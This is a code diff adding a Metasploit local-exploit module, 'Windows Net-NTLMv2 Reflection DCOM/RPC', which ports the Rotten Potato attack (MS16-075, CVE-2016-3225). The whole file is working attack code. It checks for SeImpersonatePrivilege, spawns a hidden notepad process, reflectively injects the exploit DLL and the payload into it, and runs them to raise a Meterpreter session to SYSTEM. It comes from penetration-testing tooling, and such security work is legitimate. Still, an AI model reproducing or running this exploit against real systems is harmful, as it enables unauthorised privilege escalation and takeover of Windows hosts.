@@ -1,0 +1,144 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core/post/windows/reflective_dll_injection'
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = NormalRanking
+
+  include Msf::Post::File
+  include Msf::Post::Windows::Priv
+  include Msf::Post::Windows::Process
+  include Msf::Post::Windows::FileInfo
+  include Msf::Post::Windows::ReflectiveDLLInjection
+
+  def initialize(info={})
+    super(update_info(info, {
+      'Name'           => 'Windows Net-NTLMv2 Reflection DCOM/RPC',
+      'Description'    => %q(
+        Module utilizes the Net-NTLMv2 reflection between DCOM/RPC
+        to achieve a SYSTEM handle for elevation of privilege. Currently the module
+        does not spawn as SYSTEM, however once achieving a shell, one can easily
+        use incognito to impersonate the token.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'FoxGloveSec', # the original Potato exploit
+          'breenmachine', # Rotten Potato NG!
+          'Mumbai' # Austin : port of RottenPotato for reflection & quick module
+        ],
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Platform'       => 'win',
+      'SessionTypes'   => ['meterpreter'],
+      'DefaultOptions' =>
+        {
+          'EXITFUNC' => 'none',
+          'WfsDelay' => '20'
+        },
+      'Targets'        =>
+        [
+          ['Automatic', {}],
+          ['Windows x86', { 'Arch' => ARCH_X86 }],
+          ['Windows x64', { 'Arch' => ARCH_X64 }]
+        ],
+      'Payload'         =>
+        {
+          'DisableNops' => true
+        },
+      'References'      =>
+        [
+          ['MSB', 'MS16-075'],
+          ['CVE', '2016-3225'],
+          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/'],
+          ['URL', 'https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/'],
+          ['URL', 'https://github.com/breenmachine/RottenPotatoNG']
+        ],
+      'DisclosureDate' => 'Jan 16 2016',
+      'DefaultTarget'  => 0
+    }))
+  end
+
+  def assign_target
+    if target.name == 'Automatic'
+      case sysinfo["Architecture"]
+      when 'x86'
+        vprint_status("Found we are on an x86 target")
+        my_target = targets[1]
+      when 'x64'
+        vprint_status("Found we are on an x64 target")
+        my_target = targets[2]
+      else
+        fail_with(Failure::NoTarget, "Unable to determine target")
+      end
+    else
+      my_target = target
+    end
+    return my_target
+  end
+
+  def verify_arch(my_target)
+    if my_target["Arch"] != sysinfo["Architecture"]
+      print_error("Assigned Target Arch = #{my_target.opts['Arch']}")
+      print_error("Actual Target Arch = #{sysinfo['Architecture']}")
+      fail_with(Failure::BadConfig, "Assigned Arch does not match reality")
+    end
+    if client.arch != sysinfo["Architecture"]
+      fail_with(Failure::BadConfig, "Session/Target Arch mismatch; WOW64 not supported")
+    else
+      vprint_good("Current payload and target Arch match....")
+    end
+  end
+
+  def check
+    privs = client.sys.config.getprivs
+    if privs.include?('SeImpersonatePrivilege')
+      return Exploit::CheckCode::Appears
+    end
+    return Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    if is_system?
+      fail_with(Failure::None, 'Session is already elevated')
+    end
+    my_target = assign_target
+    print_status("#{my_target['Arch']}")
+    verify_arch(my_target)
+    if check == Exploit::CheckCode::Safe
+      fail_with(Failure::NoAccess, 'User does not have SeImpersonate Privilege')
+    end
+    if my_target.opts['Arch'] == 'x64'
+      dll_file_name = 'rottenpotato.x64.dll'
+      vprint_status("Assigning payload rottenpotato.x64.dll")
+    elsif my_target.opts['Arch'] == 'x86'
+      dll_file_name = 'rottenpotato.x86.dll'
+      vprint_status("Assigning payload rottenpotato.x86.dll")
+    else
+      fail_with(Failure::BadConfig, "Unknown target arch; unable to assign exploit code")
+    end
+    print_status('Launching notepad to host the exploit...')
+    notepad_process = client.sys.process.execute('notepad.exe', nil, 'Hidden' => true)
+    begin
+      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
+      print_good("Process #{process.pid} launched.")
+    rescue Rex::Post::Meterpreter::RequestError
+      print_error('Operation failed. Trying to elevate the current process...')
+      process = client.sys.process.open
+    end
+    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
+    library_path = ::File.join(Msf::Config.data_directory, "exploits", "rottenpotato", dll_file_name)
+    library_path = ::File.expand_path(library_path)
+    print_status("Injecting exploit into #{process.pid}...")
+    exploit_mem, offset = inject_dll_into_process(process, library_path)
+    print_status("Exploit injected. Injecting payload into #{process.pid}...")
+    payload_mem = inject_into_process(process, payload.encoded)
+    # invoke the exploit, passing in the address of the payload that
+    # we want invoked on successful exploitation.
+    print_status('Payload injected. Executing exploit...')
+    process.thread.create(exploit_mem + offset, payload_mem)
+    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
+  end
+end
